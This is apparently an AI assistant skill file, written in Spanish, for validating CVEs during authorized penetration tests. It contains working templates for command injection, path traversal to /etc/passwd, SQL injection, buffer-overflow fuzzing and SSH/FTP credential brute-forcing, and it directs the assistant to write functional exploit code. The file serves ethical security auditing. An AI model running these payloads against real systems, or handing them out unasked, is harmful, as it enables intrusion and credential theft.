---
name: cve-poc-validator
description: >
  Usar esta skill cuando el usuario (hacker ético / auditor) quiera validar vulnerabilidades CVE
  ya identificadas mediante pruebas de concepto (POC), scripts o exploits reales para descartar
  falsos positivos/negativos. Activa cuando se mencionen: POC, prueba de concepto, validar CVE,
  confirmar vulnerabilidad, exploit, script de explotación, descartar falso negativo/positivo,
  código de prueba, PoC bash/python/C, enlaces exploit, github CVE. También activa cuando el
  usuario proporcione una lista de CVEs y pida código o scripts para probarlos.
  Contexto: hackingyseguridad.com — auditoría ofensiva ética, Kali Linux, entorno controlado.
---

# Skill: Validación de CVEs con POC — Descarte de Falsos Negativos

A partir de una lista de CVEs identificados, genera:
1. **Tabla priorizada** por facilidad de explotación + criticidad CVSS
2. **Código POC** (Bash, Python3 o C) para cada CVE — validación directa
3. **Enlaces** a repositorios públicos con POC/exploits por CVE

---

## Contexto de uso

- Auditor: hacker ético con autorización escrita sobre el sistema objetivo
- Entorno: Kali Linux (o equivalente offensive distro)
- Objetivo: confirmar explotabilidad real, descartar falsos negativos de escáner
- Herramientas base disponibles: nmap, metasploit, curl, python3, gcc, searchsploit

---

## Flujo de trabajo

### PASO 1 — Recibir lista de CVEs

Si el usuario no los ha proporcionado, solicitar:
- CVE-ID (ej: CVE-2024-XXXX)
- Servicio/componente afectado y versión
- IP/puerto del objetivo (para construir comandos concretos)
- Escáner origen (Nessus / OpenVAS / Nuclei / Nmap NSE / manual)

Si los CVEs ya están en la conversación, extraerlos directamente.

---

### PASO 2 — Tabla de priorización (Explotabilidad + CVSS)

Ordenar por **facilidad de explotación** (primero) y CVSS score (segundo):

| # | CVE | CVSS | Severidad | Servicio | Facilidad POC | Tipo Exploit | Autenticación |
|---|-----|------|-----------|----------|---------------|--------------|---------------|
| 1 | CVE-XXXX | 9.8 | Crítica | Apache 2.4.49 | ★★★★★ Trivial | Path Traversal/RCE | No requerida |
| 2 | CVE-XXXX | 7.5 | Alta | OpenSSH 7.x | ★★★★☆ Fácil | User Enum | No requerida |

**Escala de facilidad:**
| Estrellas | Descripción |
|-----------|-------------|
| ★★★★★ | Un comando / curl / una línea |
| ★★★★☆ | Script simple <20 líneas |
| ★★★☆☆ | Script moderado, dependencias mínimas |
| ★★☆☆☆ | Exploit compilado o módulo MSF |
| ★☆☆☆☆ | Complejo, requiere cadena de explotación |

---

### PASO 3 — POC por CVE

Para cada CVE generar bloque con esta estructura:

```
═══════════════════════════════════════════════════
CVE-XXXX-YYYY | CVSS X.X | [SEVERIDAD] | [SERVICIO]
═══════════════════════════════════════════════════
Descripción:  Qué es la vulnerabilidad (1-2 líneas técnicas)
Afecta a:     Producto vX.X – vX.Y
Condición:    Qué debe cumplirse para ser explotable
Indicador:    Qué output/respuesta confirma vulnerabilidad real (≠ falso +)

── POC BASH ──────────────────────────────────────
#!/bin/bash
# CVE-XXXX-YYYY — [Nombre vuln]
# Uso: ./poc.sh <TARGET_IP> <PORT>
TARGET=$1; PORT=$2
[código funcional]
# RESULTADO POSITIVO: [qué ver en output]
# RESULTADO NEGATIVO: [qué indica falso positivo del escáner]

── POC PYTHON3 ───────────────────────────────────
#!/usr/bin/env python3
# CVE-XXXX-YYYY
[código funcional con imports mínimos]

── POC C (si aplica) ─────────────────────────────
/* CVE-XXXX-YYYY */
[código C compilable con gcc]

── VALIDACIÓN CON HERRAMIENTAS ESTÁNDAR ──────────
# Nmap NSE (si existe script):
nmap -sV --script [script-name] -p PORT TARGET

# Metasploit (si existe módulo):
use [exploit/path/module]
set RHOSTS TARGET; set RPORT PORT; check

# Nuclei (si existe template):
nuclei -u TARGET -t cves/YYYY/CVE-XXXX-YYYY.yaml

── ENLACES POC / EXPLOIT ─────────────────────────
- GitHub PoC:        https://github.com/search?q=CVE-XXXX-YYYY
- ExploitDB:         https://www.exploit-db.com/search?cve=XXXX-YYYY
- NVD:               https://nvd.nist.gov/vuln/detail/CVE-XXXX-YYYY
- Nuclei Templates:  https://github.com/projectdiscovery/nuclei-templates
- PacketStorm:       https://packetstormsecurity.com/search/?q=CVE-XXXX-YYYY
- PoC-in-GitHub:     https://github.com/nomi-sec/PoC-in-GitHub (índice CVE)
- Vulhub:            https://github.com/vulhub/vulhub (entornos Docker reproducibles)
```

---

### PASO 4 — Descarte de falsos negativos: guía de interpretación

Para cada POC incluir tabla de interpretación del resultado:

| Resultado obtenido | Interpretación | Acción |
|-------------------|----------------|--------|
| Output esperado exacto | ✅ CONFIRMADO — Explotable | Documentar evidencia, escalar |
| Timeout / conexión rechazada | ⚠️ Servicio no accesible / firewall | Verificar puerto, probar desde otra IP |
| Versión diferente en banner | ⚠️ Posible falso positivo del escáner | Confirmar versión real con `whatweb`/`nmap -sV` |
| Respuesta parcial | ⚠️ Mitigación parcial activa (WAF/patch) | Probar variantes del payload |
| Error de autenticación | ❌ Requiere credenciales — recalificar | Ajustar condición de explotación |
| HTTP 200 sin payload ejecutado | ❌ Falso positivo confirmado | Marcar como NO explotable, cerrar |

**Metodología de confirmación (3 pasos):**
```
1. Verificar versión real del servicio (nmap -sV / curl -I / banner grabbing)
2. Ejecutar POC en entorno controlado/similar antes del objetivo real
3. Validar con ≥2 herramientas independientes antes de marcar como CONFIRMADO
```

---

### PASO 5 — Resumen de evidencias

Tabla final para incluir en informe:

| CVE | Herramienta POC | Comando ejecutado | Output obtenido | Veredicto |
|-----|----------------|-------------------|-----------------|-----------|
| CVE-XXXX | poc.sh custom | `./poc.sh 10.0.0.1 80` | `[output real]` | ✅ CONFIRMADO |
| CVE-YYYY | Nmap NSE | `nmap --script ...` | `[output real]` | ❌ FALSO POSITIVO |

---

## Fuentes de POCs — Referencias canónicas

```
BÚSQUEDA DE POCs:
├── https://github.com/nomi-sec/PoC-in-GitHub          ← Índice CVE → PoC en GitHub
├── https://github.com/trickest/cve                     ← CVEs con PoC verificados
├── https://www.exploit-db.com                          ← ExploitDB (searchsploit offline)
├── https://packetstormsecurity.com                     ← PacketStorm exploits
├── https://sploitus.com                                ← Buscador unificado exploits
├── https://vulhub.org                                  ← Entornos Docker vulnerables
├── https://github.com/projectdiscovery/nuclei-templates← Templates Nuclei por CVE
├── https://nvd.nist.gov                                ← NVD — referencias oficiales
└── https://cve.mitre.org                               ← MITRE CVE database

BÚSQUEDA RÁPIDA EN GITHUB:
  https://github.com/search?q=CVE-XXXX-YYYY+poc&type=repositories
  https://github.com/search?q=CVE-XXXX-YYYY+exploit&type=repositories

SEARCHSPLOIT (local Kali):
  searchsploit CVE-XXXX-YYYY
  searchsploit -x [path/to/exploit]   # Ver código
  searchsploit -m [path/to/exploit]   # Copiar al directorio actual
```

---

## Plantillas POC por tipo de vulnerabilidad

### RCE / Command Injection
```bash
#!/bin/bash
# Detección RCE via command injection
TARGET=$1; PORT=$2; PATH_VULN=$3
PAYLOAD="id;hostname;whoami"
RESPONSE=$(curl -sk "http://$TARGET:$PORT/$PATH_VULN?param=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")")
echo "[*] Respuesta: $RESPONSE"
echo "[!] POSITIVO si aparece: uid= / root / hostname"
```

### Path Traversal / LFI
```bash
#!/bin/bash
TARGET=$1; PORT=$2
for PAYLOAD in "../../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd"; do
  RESP=$(curl -sk "http://$TARGET:$PORT/$PAYLOAD")
  if echo "$RESP" | grep -q "root:x:0"; then
    echo "[+] VULNERABLE con payload: $PAYLOAD"
    echo "$RESP" | head -5
    break
  fi
done
```

### SQL Injection (detección)
```bash
#!/bin/bash
TARGET=$1; PORT=$2; ENDPOINT=$3
# Error-based detection
for PAYLOAD in "'" "' OR '1'='1" "' AND SLEEP(5)--" "1; SELECT SLEEP(5)--"; do
  START=$(date +%s%N)
  RESP=$(curl -sk "http://$TARGET:$PORT/$ENDPOINT?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")")
  END=$(date +%s%N)
  ELAPSED=$(( (END - START) / 1000000 ))
  if echo "$RESP" | grep -qiE "sql|mysql|syntax|error|ORA-|pg_"; then
    echo "[+] ERROR-BASED SQLi detectado con: $PAYLOAD"
  fi
  if [ $ELAPSED -gt 4500 ]; then
    echo "[+] TIME-BASED SQLi detectado (${ELAPSED}ms) con: $PAYLOAD"
  fi
done
```

### Buffer Overflow / Memory Corruption (detección básica)
```bash
#!/bin/bash
TARGET=$1; PORT=$2
# Fuzzing básico para detección de crash
python3 -c "
import socket, time
payloads = [b'A'*100, b'A'*500, b'A'*1000, b'A'*5000, b'A'*10000]
for p in payloads:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(('$TARGET', $PORT))
        s.send(p + b'\r\n')
        r = s.recv(1024)
        print(f'[~] {len(p)} bytes — servicio responde: {r[:50]}')
        s.close()
    except Exception as e:
        print(f'[+] POSIBLE CRASH con {len(p)} bytes: {e}')
    time.sleep(0.5)
"
```

### Autenticación débil / fuerza bruta
```bash
#!/bin/bash
TARGET=$1; PORT=$2; SERVICE=$3  # ssh / ftp / http-basic
USERS="admin root user administrator"
PASSES="admin password 123456 root toor admin123"
for U in $USERS; do
  for P in $PASSES; do
    case $SERVICE in
      ssh) ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p $PORT $U@$TARGET "id" 2>/dev/null && echo "[+] CRED VÁLIDA: $U:$P" ;;
      ftp) echo -e "USER $U\nPASS $P\nQUIT" | nc -w3 $TARGET $PORT 2>/dev/null | grep -q "230" && echo "[+] FTP VÁLIDO: $U:$P" ;;
    esac
  done
done
```

---

## Notas operativas

- **Autorización**: Ejecutar ÚNICAMENTE en sistemas con autorización escrita. Guardar scope en `/root/pentest/scope.txt`
- **Logging**: Registrar cada prueba con timestamp: `script -a /root/pentest/evidence_$(date +%Y%m%d).log`
- **Falso positivo vs falso negativo**:
  - *Falso positivo*: escáner reporta vuln pero POC no confirma → marcar como NO EXPLOTABLE
  - *Falso negativo*: escáner no reporta pero inspección manual sí → documentar como hallazgo manual
- **Versiones**: Confirmar siempre versión exacta antes del POC (`nmap -sV -sC`, `whatweb`, `curl -I`)
- **Entorno seguro**: Probar POCs primero en laboratorio (Vulhub / TryHackMe / HackTheBox) si es posible
